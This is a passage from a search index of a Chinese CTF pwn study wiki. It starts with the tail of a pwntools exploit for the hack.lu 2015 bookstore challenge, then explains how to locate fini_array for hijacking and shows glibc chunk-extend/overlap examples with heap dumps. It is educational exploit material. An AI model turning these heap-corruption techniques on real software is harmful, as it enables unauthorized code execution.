0x88 , ' \\x00 ' ) payload4 += p64 ( 0x151 ) edit ( 1 , payload4 ) #gdb.attach(p) payload3 = '5' * 8 + p64 ( attack_addr ) + p64 ( attack_addr + 2 ) p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( payload3 ) p . interactive () \u53c2\u8003\u6587\u7ae0 \u00b6 hack.lu 2015 bookstore writeup 2015-hacklu-bookstore \u8865\u5145\u603b\u7ed3 \u00b6 \u600e\u4e48\u627e fini_array \uff1f \u00b6 \u9996\u5148 fini_array \u662f __libc_csu_fini \u51fd\u6570\u91cc\u9762\u4f1a\u7528\u7684\u4e00\u4e2a\u5217\u8868\uff0c\u5f53\u7a0b\u5e8f\u9000\u51fa\u65f6\u4f1a\u8c03\u7528\u8fd9\u4e2a\u6570\u7ec4\u5b58\u653e\u7684\u4e00\u4e2a\u6216\u4e24\u4e2a\u51fd\u6570\uff0c\u8c03\u7528\u5b8c\u6210\u540e\u624d\u7ee7\u7eed\u5b8c\u6210\u9000\u51fa\u51fd\u6570\uff0c\u8fd9\u65f6\u624d\u662f\u771f\u6b63\u9000\u51fa\u7a0b\u5e8f\u3002 64 \u4f4d\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f \u00b6 fini_array \u6570\u7ec4\u957f\u5ea6\u4e3a 0x10 \u5b57\u8282\uff0c\u91cc\u9762\u653e\u4e86\u4e24\u4e2a\u51fd\u6570\u5730\u5740\uff0c\u9000\u51fa main \u51fd\u6570\u4f1a\u5148\u6267\u884c fini_array[1] \uff0c\u7136\u540e\u6267\u884c fini_array[0] \u3002 \u5728 \u52ab\u6301 64 \u4f4d\u9759\u6001\u7a0b\u5e8f fini_array \u8fdb\u884c ROP \u653b\u51fb \u91cc\u9762\u63a5\u89e6\u7684\u662f 64 \u4f4d\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u662f\u6ca1\u6709\u7b26\u53f7\u8868\u7684\uff0c\u5bfb\u627e fini_array \u65b9\u6cd5\u662f\uff1a \u9996\u5148 readelf -h \u7a0b\u5e8f\u540d \u67e5\u770b\u7a0b\u5e8f\u52a0\u8f7d\u5165\u53e3\u5730\u5740\u3002 gdb \u8c03\u8bd5\u5c06\u65ad\u70b9\u6253\u5728\u5165\u53e3\u5730\u5740 \uff0c\u7136\u540e\u627e\u5230\u6709\u4e09\u4e2a\u4f20\u53c2\u7684 mov \u6307\u4ee4\uff0cmov r8 \u5c31\u662f __libc_csu_fini \u7684\u5730\u5740\uff1a .text:0000000000401A60 public start .text:0000000000401A60 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401A60 ; __unwind { .text:0000000000401A60 xor ebp, ebp .text:0000000000401A62 mov r9, rdx .text:0000000000401A65 pop rsi .text:0000000000401A66 mov rdx, rsp .text:0000000000401A69 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401A6D push rax .text:0000000000401A6E push rsp .text:0000000000401A6F mov r8, offset sub_402BD0 ; fini .text:0000000000401A76 mov rcx, offset loc_402B40 ; init .text:0000000000401A7D mov rdi, offset main .text:0000000000401A84 db 67h .text:0000000000401A84 call __libc_start_main .text:0000000000401A8A hlt .text:0000000000401A8A ; } // starts at 401A60 .text:0000000000401A8A start endp \u7136\u540e x /20i addr \u67e5\u770b\u8be5\u5730\u5740\u5f00\u59cb\u7684\u6c47\u7f16\uff0c\u627e\u5230 lea rbp,[rip+0xb***1] # 0x4***f0 \uff0c\u8fd9\u4e2a\u5730\u5740\u5c31\u662f fini_array[1] \u7684\u5730\u5740\uff1a pwndbg> x/20i 0x402bd0 0x402bd0 <__libc_csu_fini>: push rbp 0x402bd1 <__libc_csu_fini+1>: lea rax, [ rip+0xb24e8 ] # 0x4***c0 0x402bd8 <__libc_csu_fini+8>: lea rbp, [ rip+0xb24d1 ] # 0x4***b0 0x402bdf <__libc_csu_fini+15>: push rbx 0x402be0 <__libc_csu_fini+16>: sub rax,rbp 0x402be3 <__libc_csu_fini+19>: sub rsp,0x8 0x402be7 <__libc_csu_fini+23>: sar rax,0x3 0x402beb <__libc_csu_fini+27>: je 0x402c06 <__libc_csu_fini+54> 0x402bed <__libc_csu_fini+29>: lea rbx, [ rax-0x1 ] 0x402bf1 <__libc_csu_fini+33>: nop DWORD PTR [ rax+0x0 ] 0x402bf8 <__libc_csu_fini+40>: call QWORD PTR [ rbp+rbx*8+0x0 ] 0x402bfc <__libc_csu_fini+44>: sub rbx,0x1 0x402c00 <__libc_csu_fini+48>: cmp rbx,0xffffffffffffffff 0x402c04 <__libc_csu_fini+52>: jne 0x402bf8 <__libc_csu_fini+40> 0x402c06 <__libc_csu_fini+54>: add rsp,0x8 0x402c0a <__libc_csu_fini+58>: pop rbx 0x402c0b <__libc_csu_fini+59>: pop rbp 0x402c0c <__libc_csu_fini+60>: jmp 0x48f52c <_fini> 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f \u00b6 fini_array \u6570\u7ec4\u957f\u5ea6\u4e3a 0x8 \u5b57\u8282\uff0c\u91cc\u9762\u653e\u4e86\u4e00\u4e2a\u51fd\u6570\u5730\u5740\uff0c\u9000\u51fa main \u51fd\u6570\u4f1a\u6267\u884c fini_array[0]\u3002 gdb \u8f93\u5165 elf \u627e .fini_array \uff0c\u5f00\u59cb\u5730\u5740\u5c31\u662f fini_array[0] \u6216\u8005 IDA ctrl+s \u627e .fini_array \u5206\u6bb5 \uff1a 64 \u4f4d\u4e2d\u53ea\u6709 fini_array[0] \uff0c\u6ca1\u6709 fini_array[1] \uff0c\u4e5f\u5c31\u662f\u53ea\u80fd\u8fd0\u884c\u5199\u5165 fini_array \u4e00\u6b21\uff0c\u7136\u540e\u5c31\u6b63\u5e38\u9000\u51fa\u4e86\u3002\u65e0\u6cd5\u50cf\u9759\u6001\u7f16\u8bd1\u90a3\u6837\u91cd\u590d\u8c03\u7528\u3002 \u9759\u6001\u52a8\u6001\u5229\u7528\u65b9\u5f0f\u5c0f\u7ed3 \u00b6 \u52a8\u6001\u7a0b\u5e8f\u76ee\u524d\u5c31\u9047\u5230 2015 hacklu bookstore \u8fd9\u4e00\u9898\uff0c\u592a\u83dc\u4e86\u603b\u7ed3\u4e0d\u51fa\u89c4\u5f8b\u3002 \u9759\u6001\u7a0b\u5e8f\u57fa\u672c\u4e0a\u5957\u8def\u662f\u52ab\u6301 fini_array + \u5faa\u73af\u5199\u5165\uff0c\u5c06 ROP \u94fe\u5e03\u7f6e\u5230 fini_array + 0x10 \uff0c\u5199\u5165\u5b8c\u6210\u540e\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u6267\u884c ROP \u94fe\u3002\u9759\u6001\u7a0b\u5e8f\u7684\u603b\u7ed3\u53ef\u4ee5\u770b\u770b \u6dc7\u6dc7\u5e08\u5085\u6587\u7ae0 \u3002 fastbin \u4e0d\u4e0e\u7269\u7406\u5730\u5740\u76f8\u90bb fastbin \u5408\u5e76\uff0c\u4e0d\u4e0e top chunk \u5408\u5e76 \u21a9 \u5206\u914d\u7684\u5b89\u5168\u68c0\u67e5\u673a\u5236\uff0c\u8bf7\u770b malloc \u51fd\u6570\u4ecb\u7ecd \u21a9","title":"\u5806\u91cd\u53e0&\u62d3\u5c55"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_1","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u5806\u62d3\u5c55&amp;\u6ea2\u51fa"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_2","text":"chunk extend \u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u5229\u7528\u624b\u6cd5\uff0c\u901a\u8fc7 extend \u53ef\u4ee5\u5b9e\u73b0 chunk overlapping \u7684\u6548\u679c\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u65f6\u673a\u548c\u6761\u4ef6\uff1a \u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e","title":"\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_3","text":"chunk extend \u6280\u672f\u80fd\u591f\u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e ptmalloc \u5728\u5bf9\u5806 chunk \u8fdb\u884c\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684\u5404\u79cd\u5b8f\u3002 \u5728 ptmalloc \u4e2d\uff0c**\u83b7\u53d6 chunk \u5757\u5927\u5c0f**\u7684\u64cd\u4f5c\u5982\u4e0b /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002 \u5728 ptmalloc \u4e2d\uff0c**\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740**\u7684\u64cd\u4f5c\u5982\u4e0b /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002 \u5728 ptmalloc \u4e2d\uff0c**\u83b7\u53d6\u524d\u4e00\u4e2a chunk \u4fe1\u606f**\u7684\u64cd\u4f5c\u5982\u4e0b /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5373\u901a\u8fc7 malloc_chunk->prev_size \u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002 \u5728 ptmalloc\uff0c**\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662f use \u72b6\u6001**\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a #define inuse(p) (((( mchunkptr )((( char * ) ( p )) + chunksize ( p ))) -> mchunk_size ) & PREV_INUSE ) \u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002 \u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1 \u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784 \u4e00\u8282\u3002 \u901a\u8fc7\u4e0a\u9762\u51e0\u4e2a\u5b8f\u53ef\u4ee5\u770b\u51fa\uff0c ptmalloc \u901a\u8fc7 chunk header \u7684\u6570\u636e\u5224\u65ad chunk \u7684\u4f7f\u7528\u60c5\u51b5\u548c\u5bf9 chunk \u7684\u524d\u540e\u5757\u8fdb\u884c\u5b9a\u4f4d \u3002\u7b80\u800c\u8a00\u4e4b\uff0c chunk extend \u5c31\u662f\u901a\u8fc7\u63a7\u5236 size \u548c pre_size \u57df\u6765\u5b9e\u73b0\u8de8\u8d8a\u5757\u64cd\u4f5c\u4ece\u800c\u5bfc\u81f4 overlapping \u7684 \u3002 \u4e0e chunk extend \u7c7b\u4f3c\u7684\u8fd8\u6709\u4e00\u79cd\u79f0\u4e3a chunk shrink \u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u53ea\u4ecb\u7ecd chunk extend \u7684\u5229\u7528\u3002 \u4ee5\u4e0b\u793a\u4f8b\u4ee3\u7801\uff0c\u8c28\u614e\u52a0\u5165 printf \u7b49\u51fd\u6570\uff0c\u56e0\u4e3a\u7a0b\u5e8f\u6ca1\u6709\u521d\u59cb\u5316\u7f13\u51b2\u533a\uff0c\u5982\u679c\u5f15\u5165\u8fd9\u4e9b\u51fd\u6570\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a\u5806\u7528\u4f5c\u7f13\u5b58","title":"\u539f\u7406"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#1-inuse-fastbin-extend","text":"\u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u5728 64 \u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u5728 32 \u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a 8 \u5b57\u8282\u504f\u79fb\u6539\u4e3a 4 \u5b57\u8282 \u3002 int main ( void ) { void * ptr , * ptr1 ; ptr = malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk * ( long long * )(( long long ) ptr -0x8 ) = 0x41 ; // \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df free ( ptr ); ptr1 = malloc ( 0x30 ); // \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9 return 0 ; } \u5f53\u4e24\u4e2a malloc \u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000021 < === chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 < === chunk 2 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 < === top chunk \u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a 0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002 0x602000: 0x0000000000000000 0x0000000000000041 < === \u7be1\u6539\u5927\u5c0f 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 \u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002 Fastbins [ idx = 0 , size = 0x10 ] 0x00 Fastbins [ idx = 1 , size = 0x20 ] 0x00 Fastbins [ idx = 2 , size = 0x30 ] \u2190 Chunk ( addr = 0x602010, size = 0x40, flags = PREV_INUSE ) Fastbins [ idx = 3 , size = 0x40 ] 0x00 Fastbins [ idx = 4 , size = 0x50 ] 0x00 Fastbins [ idx = 5 , size = 0x60 ] 0x00 Fastbins [ idx = 6 , size = 0x70 ] 0x00 \u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002 call 0x400450 < malloc @ plt > mov QWORD PTR [ rbp -0x8 ], rax rax = 0x602010","title":"\u57fa\u672c\u793a\u4f8b 1\uff1a\u5bf9 inuse \u7684 fastbin \u8fdb\u884c extend"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_4","text":"\u56e0\u4e3a fastbin \u8ffd\u6c42\u6548\u7387\uff0c\u5b89\u5168\u6821\u9a8c\u673a\u5236\u5f31\uff0cfree \u65f6\u627e\u5230 fastbin \u94fe\u8868\u4e2d\u5bf9\u5e94\u5927\u5c0f\u94fe\u8868\u5c31\u653e\u5165\u4e86\u3002prev_inuse \u7b49\u4e0d\u4f1a\u6821\u9a8c\u3002\u7269\u7406\u5730\u5740\u76f8\u90bb\u7684\u7a7a\u95f2 fastbin \u4e0d\u4f1a\u5408\u5e76\u3002 1","title":"\u6ce8\u89e3"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#2-inuse-smallbin-extend","text":"\u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8e unsorted bin \u94fe\u8868\u4e2d\u3002 \u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 \u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f 0x70\uff09 int main () { void * ptr , * ptr1 ; ptr = malloc ( 0x80 ); //\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1 malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2 malloc ( 0x10 ); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76\u7684chunk3 * ( int * )(( int ) ptr -0x8 ) = 0xb1 ; free ( ptr ); ptr1 = malloc ( 0xa0 ); } \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548c top chunk \u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2a chunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0e top chunk \u9694\u5f00\u3002 0x602000: 0x0000000000000000 0x00000000000000b1 <===chunk1 \u7be1\u6539size\u57df 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000021 <=== \u9632\u6b62\u5408\u5e76\u7684chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk \u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165 unsorted bin \uff0cchunk3 prev_size \u5199\u5165 0xb0 \uff0cprev_inuse \u4e3a 0 \uff1a 0x602000: 0x0000000000000000 0x00000000000000b1 <=== \u88ab\u653e\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x00000000000000b0 0x0000000000000020 <=== \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) \u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9 0x4005b0 <main+74> call 0x400450 <malloc@plt> \u2192 0x4005b5 <main+79> mov QWORD PTR [ rbp-0x8 ] , rax rax : 0x0000000000602010","title":"\u57fa\u672c\u793a\u4f8b 2\uff1a\u5bf9 inuse \u7684 smallbin \u8fdb\u884c extend"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#3-free-smallbin-extend","text":"\u793a\u4f8b 3 \u662f\u5728\u793a\u4f8b 2 \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684 size \u57df\u3002 int main () { void * ptr , * ptr1 ; ptr = malloc ( 0x80 ); //\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1 malloc ( 0x10 ); //\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2 free ( ptr ); //\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin * ( int * )(( int ) ptr -0x8 ) = 0xb1 ; ptr1 = malloc ( 0xa0 ); } \u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b 0x602000: 0x0000000000000000 0x0000000000000091 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6211\u4eec\u9996\u5148\u91ca\u653e chunk1 \u4f7f\u5b83\u8fdb\u5165 unsorted bin \u4e2d unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) 0x602000: 0x0000000000000000 0x0000000000000091 <=== \u8fdb\u5165unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <=== top chunk \u7136\u540e\u7be1\u6539 chunk1 \u7684 size \u57df 0x602000: 0x0000000000000000 0x00000000000000b1 <=== size\u57df\u88ab\u7be1\u6539 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 \u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86 chunk2 \u7684\u5185\u5bb9\u3002 2","title":"\u57fa\u672c\u793a\u4f8b 3\uff1a\u5bf9 free \u7684 smallbin \u8fdb\u884c extend"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#chunk-extendshrink","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f**\u53ef\u4ee5\u63a7\u5236 chunk \u4e2d\u7684\u5185\u5bb9**\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002 \u6b64\u5916**\u901a\u8fc7 extend \u53ef\u4ee5\u5b9e\u73b0 chunk overlapping\uff0c\u901a\u8fc7 overlapping \u53ef\u4ee5\u63a7\u5236 chunk \u7684 fd/bk \u6307\u9488\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528**\u3002","title":"Chunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#4-extend-overlapping","text":"\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7 extend \u8fdb\u884c\u540e\u5411 overlapping\uff0c\u8fd9\u4e5f\u662f\u5728 CTF \u4e2d\u6700\u5e38\u51fa\u73b0\u7684\u60c5\u51b5\uff0c\u901a\u8fc7 overlapping \u53ef\u4ee5\u5b9e\u73b0\u5176\u5b83\u7684\u4e00\u4e9b\u5229\u7528\u3002 int main () { void * ptr , * ptr1 ; ptr = malloc ( 0x10 ); //\u5206\u914d\u7b2c1\u4e2a 0x80 \u7684chunk1 malloc ( 0x10 ); //\u5206\u914d\u7b2c2\u4e2a 0x10 \u7684chunk2 malloc ( 0x10 ); //\u5206\u914d\u7b2c3\u4e2a 0x10 \u7684chunk3 malloc ( 0x10 ); //\u5206\u914d\u7b2c4\u4e2a 0x10 \u7684chunk4 * ( int * )(( int ) ptr -0x8 ) = 0x61 ; free ( ptr ); ptr1 = malloc ( 0x50 ); } \u521d\u59cb\u5316\u5206\u914d 4 \u4e2a\u5806\u4e4b\u540e\uff1a \u5c06\u7b2c\u4e00\u4e2a chunk size \u4fee\u6539\u4e3a 0x61 \uff0c\u7136\u540e free \u7b2c\u4e00\u4e2a\u5806\u5757\uff0c\u7ea2\u6846\u5185\u7684\u90fd\u4f1a\u88ab\u5f53\u505a\u4e00\u4e2a\u6574\u4f53\u653e\u5165\u5230 fastbin \u5f53\u4e2d\uff1a \u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d\u5927\u5c0f\u4e3a 0x50 \uff08\u4e0d\u542bchunk header\uff09\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u5757\u5185\u5b58\u4e86\uff1a \u5728 malloc(0x50) \u5bf9 extend 